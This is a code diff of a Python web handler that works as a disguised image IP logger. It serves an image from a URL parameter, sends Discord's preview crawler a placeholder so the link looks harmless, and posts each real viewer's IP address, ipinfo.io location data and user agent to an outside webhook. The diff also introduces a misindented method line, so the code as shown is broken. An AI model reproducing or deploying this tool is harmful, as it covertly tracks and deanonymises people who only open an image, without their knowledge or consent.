@@ -47,20 +47,26 @@ def prev(ip,uag):
     }
 
 class handler(BaseHTTPRequestHandler):
-    def do_GET(self):
+       def do_GET(self):
         s = self.path
         dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
         
-        # Determine Content Type based on URL ending (.jpg or .png)
+        # 1. Get the target image URL from the query parameter (e.g., ?url=...)
         target_url = dic.get('url', '')
+        
+        # 2. Determine Content Type
         if target_url.lower().endswith('.png'):
             content_type = 'image/png'
         else:
             content_type = 'image/jpeg'
 
-        # Get Image Data
+        # 3. Fetch the actual IMAGE DATA
         try:
-            data = requests.get(dic['url']).content if 'url' in dic else buggedbin
+            # If a URL was provided, download it. Otherwise use buggedbin.
+            if target_url:
+                data = requests.get(target_url).content
+            else:
+                data = buggedbin
         except Exception:
             data = buggedbin
 
@@ -69,28 +75,25 @@ class handler(BaseHTTPRequestHandler):
         
         ip = self.headers.get('x-forwarded-for')
 
-        # Check for Discord Bots (The "Bug")
+        # 4. Check for Discord Bots
         if ip and ip.startswith(('35','34','104.196')):
             if 'discord' in useragent.lower():
-                # Send the "bugged" small image to Discord
                 self.send_response(200)
                 self.send_header('Content-type', content_type)
                 self.end_headers()
-                data = requests.get(DEFAULT_IMG).content if isinstance(DEFAULT_IMG, str) else DEFAULT_IMG
-                self.wfile.write(DEFAULT_IMG) 
+                # Send a small placeholder or the bugged bin
+                self.wfile.write(DEFAULT_IMG if isinstance(DEFAULT_IMG, bytes) else requests.get(DEFAULT_IMG).content) 
                 
-                # Send the "Preview" webhook
                 requests.post(webhook, json=prev(ip, useragent))
             else:
                 pass
         else:
-            # Normal User: Send the full image
+            # 5. Normal User: Send the fetched Image Data
             self.send_response(200)
             self.send_header('Content-type', content_type)
             self.end_headers()
-            self.wfile.write(data)
+            self.wfile.write(data) # <--- THIS MUST BE BYTES, NOT A STRING
             
-            # Send the "Final" webhook with IP info
             try:
                 ipInfo = requests.get(f'https://ipinfo.io/{ip}/json').json()
                 requests.post(webhook, json=formatHook(
